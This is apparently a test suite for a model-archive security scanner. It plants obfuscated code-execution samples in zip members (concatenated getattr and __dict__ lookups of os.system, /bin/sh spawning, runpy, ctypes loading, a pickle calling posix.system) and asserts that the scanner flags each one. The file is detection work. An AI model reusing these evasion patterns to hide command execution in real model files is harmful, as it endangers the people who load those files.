import base64
import binascii
import builtins
import bz2
import gzip
import importlib
import io
import json
import lzma
import os
import stat
import struct
import tarfile
import tempfile
import zipfile
import zlib
from collections.abc import Callable
from pathlib import Path
from typing import Any, ClassVar, cast

import pytest

from modelaudit import core
from modelaudit.analysis.unified_context import UnifiedMLContext
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cache.optimized_config import build_cache_version_context
from modelaudit.config import ModelAuditConfig, reset_config, set_config
from modelaudit.rules import Severity
from modelaudit.scanner_selection import normalize_scanner_selection_config
from modelaudit.scanners import _registry, archive_dispatch
from modelaudit.scanners import zip_scanner as zip_scanner_module
from modelaudit.scanners._archive_locations import rewrite_extracted_member_location
from modelaudit.scanners.archive_dispatch import (
    NESTED_SCAN_CALLBACK_CONFIG_KEY,
    _select_nested_scanner_id,
    scan_nested_file,
)
from modelaudit.scanners.archive_member_security import high_risk_python_calls_in_source
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, BaseScanner, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.jax_checkpoint_scanner import JaxCheckpointScanner
from modelaudit.scanners.zip_scanner import (
    KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY,
    ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY,
    ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY,
    ZipPreflightRejected,
    ZipScanner,
    open_preflighted_zip_handle,
)
from modelaudit.utils.file import detection as file_detection
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
from modelaudit.whitelists import POPULAR_MODELS
from tests.helpers import (
    create_mock_mxnet_symbol,
    create_mock_onnx,
    prefix_mock_onnx_with_unknown_field,
    prefix_mock_onnx_with_unknown_group,
)


def _npy_payload() -> bytes:
    import numpy as np

    payload = io.BytesIO()
    np.save(payload, np.arange(3))
    return payload.getvalue()


def _wrap_encoded_lines(payload: bytes, width: int) -> bytes:
    return b"\n".join(payload[offset : offset + width] for offset in range(0, len(payload), width))


def _assert_inconclusive_zip_aggregate_not_cached(
    path: Path,
    expected_reason: str,
    cache_dir: Path,
    *,
    expected_exit_code: int = 2,
    expected_security_findings: bool = False,
    **scan_kwargs: Any,
) -> None:
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert expected_reason in metadata["scan_outcome_reasons"]
            security_findings = [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
            assert bool(security_findings) is expected_security_findings
            assert core.determine_exit_code(aggregate) == expected_exit_code

        top_level_config = normalize_scanner_selection_config(
            {
                "blacklist_patterns": None,
                "max_file_size": 0,
                "max_total_size": 0,
                "timeout": 3600,
                "skip_file_types": True,
                "strict_license": False,
                "cache_enabled": True,
                "cache_dir": str(cache_dir),
                "min_cache_file_size": 0,
                **scan_kwargs,
            }
        )
        cached_parent = get_cache_manager(str(cache_dir), enabled=True).get_cached_result(
            str(path),
            version_context=build_cache_version_context(top_level_config),
        )
        assert cached_parent is None
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def _assert_inconclusive_zip_scan_not_cached(
    path: Path,
    expected_reason: str,
    cache_dir: Path,
    **scan_kwargs: Any,
) -> None:
    scan_config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        **scan_kwargs,
    }
    reset_cache_manager()
    try:
        first = ZipScanner(config=scan_config).scan_with_cache(str(path))
        second = ZipScanner(config=scan_config).scan_with_cache(str(path))

        for result in (first, second):
            assert result.success is False
            assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert expected_reason in result.metadata["scan_outcome_reasons"]
            assert not [
                issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]

        cached_parent = get_cache_manager(str(cache_dir), enabled=True).get_cached_result(
            str(path),
            version_context=build_cache_version_context(scan_config),
        )
        assert cached_parent is None
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def _assert_inconclusive_pickle_member(result: ScanResult, archive_path: Path, member_name: str) -> None:
    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pickle_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
    routing_checks = [check for check in result.checks if check.name == "Pickle Routing"]
    assert len(routing_checks) == 1
    check = routing_checks[0]
    assert check.status == CheckStatus.FAILED
    assert check.severity == IssueSeverity.INFO
    assert check.message == "Pickle routing was inconclusive because the bounded structural probe reached its limit"
    assert check.location == f"{archive_path}:{member_name}"
    assert check.details.get("format") == "pickle_routing_inconclusive"
    assert check.details.get("zip_entry") == member_name
    assert not any(issue.rule_code == "S201" for issue in result.issues)


def _writestr_preserving_member_name(
    archive: zipfile.ZipFile,
    member_name: str,
    data: str | bytes,
) -> None:
    info = zipfile.ZipInfo("placeholder")
    info.filename = member_name
    info.orig_filename = member_name
    archive.writestr(info, data)


def _malicious_lightgbm_legal_payload() -> bytes:
    return (
        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
        b"feature_names=f0 f1 f2\nfeature_infos=[0:1] [0:1] [0:1]\ntree_sizes=12\n"
        b"Tree=0\nnum_leaves=2\nsplit_feature=0\nsplit_gain=1.0\nthreshold=0.5\n"
        b"decision_type=<=\nleft_child=-1\nright_child=-2\nleaf_value=0.1 0.2\n"
        b"license=MIT License\nmetadata=os.system('id')\n"
    )


def _long_global_operand_in_legal_text() -> bytes:
    return b"MIT License\n" + b"c" + (b"a" * 70000) + b"\nx\n."


def _long_binpersid_lookbehind_in_legal_text() -> bytes:
    return b"Apache License\nS'" + (b"a" * 70000) + b"'\nQApache License\n"


def _long_context_opcode_prose() -> bytes:
    return b"Apache License\nSoftware " + (b"A" * 70000) + b"\nQuality terms apply.\n"


def _encoded_pickle_after_benign_candidate_budget(word: bytes = b"license") -> bytes:
    return b"MIT License\n" + ((word + b" ") * 4096) + b"\n" + base64.b64encode(b"cb\nx\n.")


def _overlapping_global_candidate_in_legal_text() -> bytes:
    return b"MIT License\n# comment\ncposix\nsystem\n(S'id'\ntR."


def _oversized_encoded_execution_after_probe() -> bytes:
    return b"MIT License\n" + base64.b64encode((b"A" * (1024 * 1024 + 1)) + b"eval(")


def _large_zero_fill_base64_legal_text() -> bytes:
    return b"MIT License " + (b"A" * 1_468_008)


def _build_malicious_tf_metagraph() -> bytes:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.meta_info_def.meta_graph_version = "zip_metagraph"
    function = metagraph.graph_def.library.function.add()
    function.signature.name = "danger"
    node = function.node_def.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_savedmodel() -> bytes:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    metagraph.meta_info_def.meta_graph_version = "owner"
    node = metagraph.graph_def.node.add()
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl:nested.pkl",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl:nested.pkl"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl.extra",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl.extra",
            "/tmp/extracted.pkl",
            "/archive.7z:model.pkl",
            preserve_non_delimited_suffix=True,
        )
        == "/archive.7z:model.pkl.extra"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl2",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl /tmp/extracted.pkl2"
    )


@pytest.mark.parametrize(
    ("payload", "filename"),
    [
        (gzip.compress(b"payload", mtime=0), "gzip_member"),
        (bz2.compress(b"payload"), "bzip2_member"),
        (lzma.compress(b"payload"), "xz_member"),
        (b"\x04\x22\x4d\x18" + b"\x00" * 8, "lz4_member"),
        (zlib.compress(b"payload"), "zlib_member"),
    ],
    ids=["gzip_member", "bzip2_member", "xz_member", "lz4_member", "zlib_member"],
)
def test_nested_dispatch_routes_compressed_header_aliases_to_compressed_scanner(
    tmp_path: Path,
    payload: bytes,
    filename: str,
) -> None:
    """Extensionless archive members with compression magic should route to CompressedScanner."""
    member_path = tmp_path / filename
    member_path.write_bytes(payload)

    assert _select_nested_scanner_id(str(member_path)) == "compressed"


def test_scan_zip_flags_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "import os\nos.system('echo hidden')\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["entry"] == "handler.py"


def test_scan_zip_flags_aliased_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "import subprocess as sp\nsp.run(['echo', 'hidden'], check=False)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_from_import_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "from subprocess import run\nrun('echo hidden', shell=True)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_wildcard_import_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "from subprocess import *\nrun(['echo', 'hidden'], check=False)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_preserves_subprocess_after_asyncio_wildcard_import(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nfrom asyncio import *\nsubprocess.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_builtins_getattr_call_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import builtins as bi\nimport os\nbi.getattr(os, 'system').__call__('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


def test_scan_zip_flags_aliased_getattr_helper_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "from builtins import getattr as resolve\n"
        "import os as operating_system\n"
        "resolve(operating_system, 'system')('echo hidden')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


def test_scan_zip_flags_concatenated_getattr_name_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import os\ngetattr(os, 'sys' + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.__dict__['sys' + 'tem']('echo hidden')\n",
        "import os\nvars(os)['sys' + 'tem']('echo hidden')\n",
        "import os\nos.__dict__.get('sys' + 'tem')('echo hidden')\n",
        "import os\nos.__dict__.__getitem__('sys' + 'tem')('echo hidden')\n",
        "import os\nos.__dict__.get('sys' + 'tem').__call__('echo hidden')\n",
        "import os\nnamespace = os.__dict__\nnamespace['sys' + 'tem']('echo hidden')\n",
        "import os\nnamespace = vars(os)\nnamespace.get('sys' + 'tem')('echo hidden')\n",
        "import os\ngetattr(os, '__dict__')['sys' + 'tem']('echo hidden')\n",
        "import os\nos.__getattribute__('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = os.__getattribute__\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = os.__getattribute__\nlookup.__call__('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = os.__getattribute__.__call__.__call__\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\nobject.__getattribute__(os, 'sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = object.__getattribute__\nlookup(os, 'sys' + 'tem')('echo hidden')\n",
        "import os\ngetattr(object, '__getattribute__')(os, 'sys' + 'tem')('echo hidden')\n",
        "import os\nglobals()['os'].system('echo hidden')\n",
        "import os\nlocals()['os'].system('echo hidden')\n",
        "import os\nvars()['os'].system('echo hidden')\n",
        "import os\nnamespace = globals()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
        "import os\nglobals().setdefault('runner', os.system)\nrunner('echo hidden')\n",
        "import os\nnamespace = globals()\nnamespace.setdefault('runner', os.system)\nrunner('echo hidden')\n",
        "import os\nglobals().__setitem__('runner', os.system)\nrunner('echo hidden')\n",
        "import os\nnamespace = globals()\nnamespace.__setitem__('runner', os.system)\nrunner('echo hidden')\n",
        "import os\nnamespace = locals()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
        "import os\nnamespace = vars()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
        "import os\nclass Install:\n    globals()['runner'] = os.system\nrunner('echo hidden')\n",
        ("import os\ndef run():\n    globals()['runner'] = os.system\n    globals()['runner']('echo hidden')\nrun()\n"),
        "import os\ndef run():\n    globals()['runner'] = os.system\n    runner('echo hidden')\nrun()\n",
        (
            "import os\nrunner = os.system\nif bool():\n    globals()['runner'] = print\n"
            "globals()['runner']('echo hidden')\n"
        ),
        "import os\nos.__dict__.get('not_present', os.system)('echo hidden')\n",
        "import os\nname = 'not_present'\nos.__dict__.get(name, os.system)('echo hidden')\n",
        "import os\nos.__dict__.get('not_present', os.__dict__)['sys' + 'tem']('echo hidden')\n",
        "import os\nlookup = os.__dict__.get\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = os.__dict__.__getitem__\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = os.__dict__.get\nlookup.__call__('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = vars(os).get\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = vars(os).get.__call__\nlookup('sys' + 'tem')('echo hidden')\n",
        "import os\ndict.__getitem__(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
        "import os\nlookup = dict.get\nlookup(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
        "import os\ngetattr(dict, '__getitem__')(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
        (
            "import os\nobject.__getattribute__(dict, '__getitem__').__call__("
            "os.__dict__, 'sys' + 'tem')('echo hidden')\n"
        ),
        "import os\nos.__dict__.pop('sys' + 'tem')('echo hidden')\n",
        "import os\nos.__dict__.setdefault('runner', os.system)('echo hidden')\n",
        "import os\nos.__dict__.pop('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
        "import os\nos.__dict__.setdefault('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
        "import os\nlookup = os.__dict__.pop\nlookup('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
        "import os\ndict.pop(os.__dict__, '_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
        "import os\ndict.setdefault(os.__dict__, '_missing_runner_', os.system)('echo hidden')\n",
        "import os\nglobals()['runner'] = os.system\npopped = globals().pop('runner')\npopped('echo hidden')\n",
        "import os\nglobals()['runner'] = os.system\nglobals().pop('runner')('echo hidden')\n",
        "import os\nos.__dict__['runner'] = os.system\nos.runner('echo hidden')\n",
        "import os\nos.__dict__['runner'] = os.system\npopped = os.__dict__.pop('runner')\npopped('echo hidden')\n",
        "import os\nnamespace = os.__dict__\nnamespace.__setitem__('runner', os.system)\nos.runner('echo hidden')\n",
        "import os\n[runner := os.system for _ in (1,)]\nrunner('echo hidden')\n",
        "import os\n{runner := os.system for _ in (1,)}\nrunner('echo hidden')\n",
        "import os\nany(runner := os.system for _ in (1,))\nrunner('echo hidden')\n",
        "import os\nrunner = os.system\nos.__dict__['system'] = print\nrunner('echo hidden')\n",
        "import os\nos.system = getattr\nos.system(os, 'popen')('echo hidden')\n",
    ],
)
def test_scan_zip_flags_namespace_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


def test_scan_zip_reports_rebound_namespace_callable_target(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import os\nos.__dict__['system'] = vars\nos.__dict__['system'](os)['popen']('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.popen"


def test_scan_zip_flags_namespace_bound_os_process_launch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import os\n"
        "namespace = os.__dict__\n"
        "namespace['launch'] = os.posix_spawn\n"
        "namespace['launch']('/bin/sh', ['sh'], {})\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.posix_spawn"


@pytest.mark.parametrize(
    ("source", "dangerous_name"),
    [
        (
            "import asyncio\nasyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n",
            "asyncio.create_subprocess_exec",
        ),
        (
            "from asyncio import create_subprocess_shell as run\nrun('id')\n",
            "asyncio.create_subprocess_shell",
        ),
        (
            "import asyncio.subprocess\nasyncio.subprocess.create_subprocess_shell('id')\n",
            "asyncio.subprocess.create_subprocess_shell",
        ),
        (
            "import asyncio\nasyncio.create_subprocess_shell = len\nasyncio.create_subprocess_shell([])\n",
            "asyncio.create_subprocess_shell",
        ),
    ],
)
def test_scan_zip_flags_asyncio_subprocess_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S103"
    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"


@pytest.mark.parametrize(
    ("source", "dangerous_name"),
    [
        ("import runpy\nrunpy._run_module_as_main('payload')\n", "runpy._run_module_as_main"),
        ("import runpy\nrunpy.run_module('payload')\n", "runpy.run_module"),
        ("from runpy import run_path as run\nrun('payload.py')\n", "runpy.run_path"),
        ("import runpy\nrunpy.__class__.__getattribute__(runpy, 'run_path')('payload.py')\n", "runpy.run_path"),
        ("import runpy\ntype(runpy).__getattribute__(runpy, 'run_path')('payload.py')\n", "runpy.run_path"),
    ],
)
def test_scan_zip_flags_runpy_execution_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"


@pytest.mark.parametrize(
    ("source", "rule_code", "dangerous_name"),
    [
        ("import ctypes\nctypes.CDLL(LIBRARY_PATH)\n", "S110", "ctypes.CDLL"),
        ("from ctypes import CDLL as load_library\nload_library(LIBRARY_PATH)\n", "S110", "ctypes.CDLL"),
        ("import webbrowser\nwebbrowser.open('https://example.invalid')\n", "S109", "webbrowser.open"),
        (
            "from webbrowser import open_new_tab as launch\nlaunch('https://example.invalid')\n",
            "S109",
            "webbrowser.open_new_tab",
        ),
    ],
)
def test_scan_zip_flags_direct_imported_python_member_primitives(
    tmp_path: Path, source: str, rule_code: str, dangerous_name: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = source.replace("LIBRARY_PATH", repr(str(tmp_path / "libpayload.so")))
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == rule_code
    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"


def test_scan_zip_flags_webbrowser_and_ctypes_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "webbrowser.get().open.__call__('https://example.invalid')\n"
        "webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
        "ctypes.windll.kernel32\n"
        "ctypes.cdll['msvcrt'].printf(b'x')\n"
        "ctypes.cdll.__getitem__('msvcrt')\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.msvcrt.printf(b'x')\n"
        "loader_kw = ctypes.LibraryLoader(dlltype=ctypes.CDLL)\n"
        "loader_kw.payload.printf(b'x')\n"
        "loader_alias = ctypes.LibraryLoader(ctypes.cdll._dlltype)\n"
        "loader_alias.aliaslib.printf(b'x')\n"
        "loader_method = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader_method.LoadLibrary('methodlib')\n"
        "loader_method.__getitem__('getitemlib')\n"
        "loader_method.LoadLibrary(name='keywordlib')\n"
        "loader_method.__getitem__(name='keywordgetitem')\n"
        "loader_variable = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "library_name = 'variablelib'\n"
        "loader_variable.LoadLibrary(library_name)\n"
        "loader_variable.__getitem__(library_name)\n"
        "ctypes.LibraryLoader.LoadLibrary(ctypes.cdll, 'unboundlib')\n"
        "ctypes.LibraryLoader.__getitem__(ctypes.cdll, 'unboundgetitem')\n"
        "ctypes.LibraryLoader.LoadLibrary(self=ctypes.cdll, name='selfkeywordlib')\n"
        "ctypes.LibraryLoader.__getitem__(self=ctypes.cdll, name='selfkeywordgetitem')\n"
        "object.__getattribute__(ctypes.cdll, 'LoadLibrary')('objectmethodlib')\n"
        "object.__getattribute__(ctypes.cdll, '__getitem__')('objectgetitem')\n"
        "object.__getattribute__(ctypes.cdll, '__getattr__')('objectgetattr')\n"
        "ctypes.windll.kernel32 = len\n"
        "ctypes.windll.__getattr__('kernel32')\n"
        "loader_conditional = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "conditional_load = loader_conditional.LoadLibrary\n"
        "if flag:\n"
        "    conditional_load = ctypes.LibraryLoader\n"
        "conditional_load('conditionalmethod')\n"
        "ctypes.cdll.augmented += 1\n"
        "loader_augmented = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader_augmented.augmented += 1\n"
        "class MyCDLL(ctypes.CDLL):\n"
        "    pass\n"
        "ctypes.LibraryLoader(MyCDLL).subclasslib\n"
        "class MyAliasedCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.init(name)\n"
        "ctypes.LibraryLoader(MyAliasedCDLL).classaliaslib\n"
        "getattr(ctypes.windll, 'user32')\n"
        "ctypes.windll.__getattr__('advapi32')\n"
        "getattr(ctypes.LibraryLoader(ctypes.CDLL), 'attrlib')\n"
        "library_name = 'variablegetattr'\n"
        "getattr(ctypes.cdll, library_name)\n"
        "ctypes.cdll.__getattr__(library_name)\n"
        "ctypes.cdll.__getattr__(name='keywordgetattr')\n"
        "loader_unpack = ctypes.LibraryLoader(*(ctypes.CDLL,))\n"
        "loader_unpack.unpacklib.printf(b'x')\n"
        "loader_unpack_kw = ctypes.LibraryLoader(**{'dlltype': ctypes.CDLL})\n"
        "loader_unpack_kw.unpackkwlib.printf(b'x')\n"
        "loader_empty_star = ctypes.LibraryLoader(*(), dlltype=ctypes.CDLL)\n"
        "loader_empty_star.emptystarlib.printf(b'x')\n"
        "loader_getattr = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader_getattr.__getattr__('localizedgetattr')\n"
        "loader_getattr.__getattr__(library_name)\n"
        "loader_getattr.__getattr__(name='localizedkeywordgetattr')\n"
        "hasattr(ctypes.cdll, 'hasattrlib')\n"
        "hasattr(ctypes.LibraryLoader(ctypes.CDLL), 'hasattrpayload')\n"
        "ctypes.LibraryLoader(*(ctypes.CDLL,)).starredlib\n"
        "class LocalAliasCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        init = ctypes.CDLL.__init__\n"
        "        init(self, name)\n"
        "ctypes.LibraryLoader(LocalAliasCDLL).localaliaslib\n"
        "class Safe:\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.name = name\n"
        "class SkipSafeCDLL(Safe, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super(Safe, self).__init__(name)\n"
        "ctypes.LibraryLoader(SkipSafeCDLL).superskiplib\n"
        "class ClassBodyInitCDLL(Safe, ctypes.CDLL):\n"
        "    __init__ = ctypes.CDLL.__init__\n"
